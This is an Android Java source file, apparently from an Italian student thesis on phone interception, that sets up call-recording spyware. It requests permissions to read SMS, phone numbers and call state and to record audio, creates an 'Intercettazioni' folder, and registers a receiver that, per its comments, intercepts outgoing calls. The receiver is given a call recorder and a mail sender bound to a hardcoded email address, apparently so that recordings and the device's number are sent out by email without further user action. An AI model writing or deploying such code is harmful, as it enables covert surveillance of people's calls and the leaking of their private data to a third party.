package corso.java.tesiintercettazionitelefoniche;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.File;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {

    private static final String LOG_TAG = "AudioRecordTest";
    private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
    private static String fileName = Environment.getExternalStorageDirectory().getAbsolutePath()+"/Intercettazioni";
    private RecordButton recordButton = null;
    private MediaRecorder recorder = null;
    private PlayButton playButton = null;
    private MediaPlayer player = null;
    private CallRecorder cr = null;
    private String [] permissions = {"android.permission.READ_PHONE_NUMBERS", "android.permission.READ_SMS", "android.permission.READ_PHONE_STATE", "android.permission.RECORD_AUDIO", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.PROCESS_OUTGOING_CALLS", "android.permission.ACCESS_NETWORK_STATE"};

    @SuppressLint("AppCompatCustomView")
    class RecordButton extends Button {
        boolean mStartRecording = true;

        OnClickListener clicker = v -> {
            cr.onRecord(mStartRecording);
            if (mStartRecording) {
                setText("Stop recording");
            } else {
                setText("Start recording");
            }
            mStartRecording = !mStartRecording;
        };

        public RecordButton(Context ctx) {
            super(ctx);
            setText("Start recording");
            setOnClickListener(clicker);
        }
    }

    @SuppressLint("AppCompatCustomView")
    class PlayButton extends Button {
        boolean mStartPlaying = true;

        OnClickListener clicker = v -> {
            cr.onPlay(mStartPlaying);
            if (mStartPlaying) {
                setText("Stop playing");
            } else {
                setText("Start playing");
            }
            mStartPlaying = !mStartPlaying;
        };

        public PlayButton(Context ctx) {
            super(ctx);
            setText("Start playing");
            setOnClickListener(clicker);
        }
    }

    private boolean checkPermission(String [] permission){
        for(int i=0; i<permission.length; i++){
            if(ActivityCompat.checkSelfPermission(this, permission[i]) != PackageManager.PERMISSION_GRANTED)
                return false;
        }
        return true;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout ll = new LinearLayout(this);
        recordButton = new RecordButton(this);
        ll.addView(recordButton,
                new LinearLayout.LayoutParams(
                        ViewGroup.LayoutParams.WRAP_CONTENT,
                        ViewGroup.LayoutParams.WRAP_CONTENT,
                        0));
        playButton = new PlayButton(this);
        ll.addView(playButton,
                new LinearLayout.LayoutParams(
                        ViewGroup.LayoutParams.WRAP_CONTENT,
                        ViewGroup.LayoutParams.WRAP_CONTENT,
                        0));

        setContentView(ll);
        TextView tx = new TextView(this);
        ll.addView(tx,  new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT,
                0));

        if (!checkPermission(permissions)) {
            ActivityCompat.requestPermissions(this, permissions, REQUEST_RECORD_AUDIO_PERMISSION);
            tx.setText("Per favore riavvia l'applicazione per utilizzare tutte le funzioni!");
        }
        if (checkPermission(new String[]{"android.permission.READ_PHONE_NUMBERS", "android.permission.READ_SMS", "android.permission.READ_PHONE_STATE"})){
            TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
            File dir = new File(fileName);
            try{
                dir.mkdir();    //crea la directory in cui salvare le intercettazioni
                cr = new CallRecorder(fileName);
            }catch(Exception e){
                Log.e(LOG_TAG, e.getMessage());
                e.printStackTrace();
            }
            String phoneNumber = tMgr.getLine1Number();
            //INTERCETTA LE CHIAMATE IN USCITA
            MailSender mail = new MailSender(this, "vincenzosantoro.h@hotmail.it");
            BroadcastReceiver br = new OutgoingCallReceiver(cr, mail, phoneNumber);
            IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
            filter.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
            filter.addAction(TelephonyManager.ACTION_PHONE_STATE_CHANGED);
            this.registerReceiver(br, filter);
            //FINE INTERCETTA CHIAMATE IN USCITA

            String operator = tMgr.getNetworkOperatorName();
            tx.setText("Il tuo numero di telefono è: \n" + phoneNumber + "\n il tuo operatore è: \n" + operator);
        }
    }

}